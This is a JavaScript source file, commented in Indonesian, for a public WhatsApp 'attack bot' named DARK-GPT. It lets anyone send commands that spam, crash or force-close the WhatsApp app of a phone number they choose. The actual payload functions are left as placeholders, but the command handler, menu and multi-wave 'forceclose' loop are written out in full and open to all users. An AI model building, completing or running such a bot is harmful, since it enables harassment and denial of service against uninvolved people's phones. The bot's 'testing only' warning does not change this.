// ==============================================
// DARK-GPT PUBLIC ATTACK BOT
// SEMUA ORANG BISA PAKE, GA PAKE WHITELIST
// ==============================================

const {
    default: makeWASocket,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const qrcode = require("qrcode-terminal");
const Pino = require("pino");
const fs = require("fs");

// ========== GLOBAL ==========
let isConnected = false;
global.sock = null;

// ========== FUNGSI ATTACK ==========
// [PASTIKAN SEMUA FUNGSI INI ADA: bulldozer, VampireBlank, protocolbug3, protocolbug5]
// Copy semua fungsi attack lu ke sini...

// ========== PUBLIC COMMAND HANDLER ==========
class PublicAttackBot {
    constructor(sock) {
        this.sock = sock;
        this.cooldown = new Map(); // Anti spam
        this.attackCount = new Map(); // Hitung attack per user
    }

    async handlePublicCommand(sender, text) {
        // Anti cooldown (5 detik)
        const now = Date.now();
        if (this.cooldown.has(sender)) {
            const lastTime = this.cooldown.get(sender);
            if (now - lastTime < 5000) {
                await this.sock.sendMessage(sender, { 
                    text: "⏳ Tunggu 5 detik lagi kontol, jangan spam!" 
                });
                return;
            }
        }
        this.cooldown.set(sender, now);

        // Parse command
        const parts = text.toLowerCase().split(' ');
        const command = parts[0];
        const targetNumber = parts[1];

        if (!targetNumber || !/^62\d{9,}$/.test(targetNumber.replace(/[^0-9]/g, ''))) {
            await this.sock.sendMessage(sender, { 
                text: "❌ Format salah goblok!\n\nContoh yang bener:\n`bulldozer 6281234567890`\n`forceclose 6281234567890`\n\nKetik `menu` buat liat semua perintah." 
            });
            return;
        }

        const target = targetNumber.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        const senderInfo = sender.split('@')[0];

        // Log
        console.log(`🔫 [ATTACK] ${senderInfo} → ${command} → ${target}`);

        // Konfirmasi ke user
        await this.sock.sendMessage(sender, { 
            text: `⚡ *ATTACK DITERIMA!*\n\n• Dari: ${senderInfo}\n• Command: ${command}\n• Target: ${target}\n\n⏳ *Sedang diproses...*` 
        });

        try {
            // Eksekusi command
            let result;
            switch(command) {
                case 'bulldozer':
                    await bulldozer(target);
                    result = "✅ Bulldozer Attack TERKIRIM!\nTarget akan kena spam sticker status!";
                    break;
                
                case 'vampire':
                    await VampireBlank(target, true);
                    result = "✅ Vampire Blank TERKIRIM!\nTarget WhatsApp mungkin crash/force close!";
                    break;
                
                case 'bug3':
                    await protocolbug3(target, true);
                    result = "✅ Protocol Bug 3 TERKIRIM!\nVideo bug + mention massal dikirim!";
                    break;
                
                case 'bug5':
                    await protocolbug5(target, true);
                    result = "✅ Protocol Bug 5 TERKIRIM!\nNewsletter bug + exploit aktif!";
                    break;
                
                case 'fullattack':
                    await bulldozer(target);
                    await new Promise(r => setTimeout(r, 1000));
                    await VampireBlank(target, true);
                    await new Promise(r => setTimeout(r, 1000));
                    await protocolbug3(target, true);
                    await new Promise(r => setTimeout(r, 1000));
                    await protocolbug5(target, true);
                    result = "☢️ *FULL ATTACK COMPLETE!*\nSemua serangan dikirim ke target!\nWhatsApp target kemungkinan besar FORCE CLOSE!";
                    break;
                
                case 'forceclose':
                    // Brutal mode
                    for (let i = 1; i <= 3; i++) {
                        await VampireBlank(target, true);
                        await this.sock.sendMessage(sender, { 
                            text: `💣 Wave ${i}/3: Vampire sent...` 
                        });
                        await new Promise(r => setTimeout(r, 800));
                        
                        await protocolbug3(target, true);
                        await this.sock.sendMessage(sender, { 
                            text: `💥 Wave ${i}/3: Protocol Bug 3 sent...` 
                        });
                        await new Promise(r => setTimeout(r, 800));
                    }
                    result = "💀 *FORCE CLOSE ATTACK COMPLETE!*\nTarget WhatsApp kemungkinan:\n• FORCE CLOSE\n• LAG PARAH\n• BUTUH REINSTALL\n• MEMORY OVERLOAD";
                    break;
                
                default:
                    await this.sock.sendMessage(sender, { 
                        text: "❌ Command ga dikenal! Ketik `menu` buat liat list command." 
                    });
                    return;
            }

            // Hitung attack user
            const count = (this.attackCount.get(sender) || 0) + 1;
            this.attackCount.set(sender, count);

            // Kirim hasil
            await this.sock.sendMessage(sender, { 
                text: `${result}\n\n📊 *STATS:*\n• Kamu udah attack: ${count}x\n• Target: ${target}\n• Waktu: ${new Date().toLocaleTimeString()}\n\n⚠️ *Gunakan dengan bijak!*` 
            });

            // Log sukses
            console.log(`✅ [SUCCESS] ${senderInfo} attacked ${target} with ${command}`);

        } catch (error) {
            console.error(`❌ [ERROR] ${senderInfo}: ${error.message}`);
            await this.sock.sendMessage(sender, { 
                text: `❌ *GAGAL!* Error: ${error.message}\n\nMungkin:\n1. Target ga valid\n2. Session bot lagi masalah\n3. WhatsApp lagi limit` 
            });
        }
    }

    sendPublicMenu(sender) {
        const menu = `
🤖 *DARK-GPT PUBLIC ATTACK BOT* 🤖
*SEMUA ORANG BISA PAKE!*

🔥 *PERINTAH ATTACK:*
• \`bulldozer 62xxx\` - Spam sticker status
• \`vampire 62xxx\` - Crash via dokumen corrupt
• \`bug3 62xxx\` - Bug video + mention 30k
• \`bug5 62xxx\` - Bug newsletter exploit
• \`fullattack 62xxx\` - SEMUA attack sekaligus
• \`forceclose 62xxx\` - BRUTAL! Force close WA target

📝 *CONTOH:*
\`bulldozer 6281234567890\`
\`forceclose 6281234567890\`

⚡ *FITUR:*
• Auto response
• No whitelist (semua bisa pake)
• Cooldown 5 detik
• Attack counter
• Error handling

⚠️ *PERINGATAN:*
• Gunakan untuk testing saja!
• Risiko banned WhatsApp!
• Jangan abuse!

🔧 *BOT INFO:*
Owner: Adz-Gantenk
Dibuat: 8/1/2026
Status: ${isConnected ? '🟢 ONLINE' : '🔴 OFFLINE'}

_Ketik command langsung, contoh: bulldozer 628xxxx_
        `;
        this.sock.sendMessage(sender, { text: menu });
    }
}

// ========== SIMPLE PANEL ==========
function showSimplePanel() {
    console.clear();
    console.log(`
╔══════════════════════════════════════╗
║    🚀 DARK-GPT PUBLIC ATTACK BOT    ║
║    🔥 NO WHITELIST - ALL ACCESS     ║
╚══════════════════════════════════════╝

📡 Status: ${isConnected ? '🟢 CONNECTED' : '🔴 CONNECTING...'}
👥 Mode: PUBLIC (Semua orang bisa attack)
⚡ Commands aktif via WhatsApp
⏱️  Started: ${new Date().toLocaleTimeString()}

📝 CARA PAKAI:
1. Scan QR dengan WhatsApp
2. Kirim command ke bot:
   • bulldozer 62xxx
   • forceclose 62xxx
3. Bot auto execute ke target!

⚠️  PERINGATAN:
• Bot ini PUBLIC, siapa saja bisa pakai!
• Risiko tinggi terhadap target!
• Gunakan dengan tanggung jawab!

========================================
`);
}

// ========== MAIN BOT ==========
async function startPublicBot() {
    try {
        const { state, saveCreds } = await useMultiFileAuthState("./auth_public");
        const { version } = await fetchLatestBaileysVersion();

        const sock = makeWASocket({
            version,
            auth: state,
            logger: Pino({ level: "silent" }),
            printQRInTerminal: true
        });

        global.sock = sock;
        const bot = new PublicAttackBot(sock);

        sock.ev.on('connection.update', (update) => {
            const { connection, qr } = update;
            
            if (qr) {
                console.log("\n📱 Scan QR ini dengan WhatsApp:");
                qrcode.generate(qr, { small: true });
            }
            
            if (connection === 'open') {
                isConnected = true;
                const dev = sock.user?.id?.split(':')[0] || 'Unknown';
                console.log(`\n✅ BOT CONNECTED! Device: ${dev}`);
                console.log(`🔥 BOT READY! Kirim command via WhatsApp`);
                console.log(`🌐 MODE: PUBLIC - Semua orang bisa attack!\n`);
                
                // Broadcast ke beberapa chat bahwa bot online
                const broadcastMsg = `🤖 *DARK-GPT PUBLIC BOT ONLINE!*\n\nBot attack WhatsApp sekarang LIVE!\nKetik \`menu\` untuk bantuan.\n\n*PERINGATAN:* Bot ini PUBLIC, hati-hati penyalahgunaan!`;
                
                // Auto join beberapa group (optional)
                // sock.sendMessage("628xxxxxxxxxx@g.us", { text: broadcastMsg });
            }
            
            if (connection === 'close') {
                isConnected = false;
                console.log("\n❌ Connection lost, reconnecting...");
                setTimeout(startPublicBot, 3000);
            }
        });

        sock.ev.on('creds.update', saveCreds);

        // ========== HANDLE SEMUA PESAN ==========
        sock.ev.on('messages.upsert', async ({ messages }) => {
            try {
                const msg = messages[0];
                if (!msg.message) return;

                const sender = msg.key.remoteJid;
                const text = msg.message.conversation || 
                            msg.message.extendedTextMessage?.text || '';

                // Show incoming message
                console.log(`📩 [${new Date().toLocaleTimeString()}] ${sender.split('@')[0]}: ${text.substring(0, 30)}...`);

                // Handle commands
                const cmd = text.toLowerCase().split(' ')[0];
                if (['bulldozer', 'vampire', 'bug3', 'bug5', 'fullattack', 'forceclose'].includes(cmd)) {
                    await bot.handlePublicCommand(sender, text);
                }
                else if (['menu', 'help', 'bot', 'start'].includes(cmd)) {
                    await bot.sendPublicMenu(sender);
                }
                else if (cmd === 'ping') {
                    await sock.sendMessage(sender, { text: '🏓 Pong! Bot aktif!' });
                }
                else if (text && !text.startsWith('!') && text.length > 3) {
                    // Auto reply untuk pesan random
                    await sock.sendMessage(sender, { 
                        text: `🤖 Ini *DARK-GPT ATTACK BOT*\n\nKetik \`menu\` untuk bantuan.\nContoh command: \`bulldozer 6281234567890\`\n\nBot ini PUBLIC, semua orang bisa pakai!` 
                    });
                }

            } catch (error) {
                console.error("Message handling error:", error);
            }
        });

        // Auto update panel setiap 10 detik
        setInterval(showSimplePanel, 10000);
        showSimplePanel();

    } catch (error) {
        console.error("Bot startup error:", error);
        setTimeout(startPublicBot, 5000);
    }
}

// ========== STARTUP ==========
console.log(`
██████╗  █████╗ ██████╗ ██╗  ██╗    ██████╗ ███████╗████████╗
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔══██╗██╔════╝╚══██╔══╝
██║  ██║███████║██████╔╝█████╔╝     ██████╔╝█████╗     ██║   
██║  ██║██╔══██║██╔══██╗██╔═██╗     ██╔══██╗██╔══╝     ██║   
██████╔╝██║  ██║██║  ██║██║  ██╗    ██████╔╝███████╗   ██║   
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚══════╝   ╚═╝   
                                                            
                PUBLIC ATTACK BOT v3.0
                NO WHITELIST - ALL ACCESS
                BY ADZ-GPT
`);

startPublicBot();